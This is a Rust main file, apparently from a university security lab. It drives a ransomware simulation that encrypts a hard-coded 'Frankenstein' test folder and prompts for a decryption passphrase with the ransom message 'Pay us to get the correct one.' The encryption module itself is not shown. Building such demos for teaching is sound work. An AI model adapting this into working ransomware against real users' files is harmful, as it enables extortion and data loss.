mod cryptography;
mod ransomware;

use ransomware::fileEncrypt::FileEncryptor;
use std::path::Path;
use std::io::{self, Write};

fn main() -> anyhow::Result<()> {
    let encryptor = FileEncryptor::new();
    
    // Path to Frankenstein folder
    let folder_path = Path::new(r"c:\Users\20231136\Desktop\lab for sec\Frankenstein"); //THIS PATH MUST BE ADJUSTED BASED ON WHERE THE FOLDER IS LOCATED ON YOUR SYSTEM , TODO
    
    println!("Encrypting Frankenstein folder...");
    encryptor.encrypt_folder(folder_path)?;
    
    println!("Encryption complete! Files are now encrypted.");
    println!("Press Enter to proceed to decryption...");
    let mut input = String::new();
    io::stdin().read_line(&mut input)?;
    
    // Keep asking for passphrase until correct or user quits
    loop {
        print!("Enter passphrase to decrypt");
        io::stdout().flush()?;
        
        let mut passphrase = String::new();
        io::stdin().read_line(&mut passphrase)?;
        let passphrase = passphrase.trim();
        
        
        // try to decrypt with entered passphrase
        println!("Attempting to decrypt...");
        match encryptor.decrypt_folder(folder_path, passphrase) {
            Ok(()) => {
                println!("Decryption successful! You get your files back now");
                break; 
            }
            Err(e) => {
                if e.to_string().contains("Invalid passphrase") {
                    println!("Wrong passphrase! Pay us to get the correct one.");
                    println!(); 
                } else {
                    println!("Decryption failed: {}", e);
                    break; 
                }
            }
        }
    }
    
    Ok(())
}
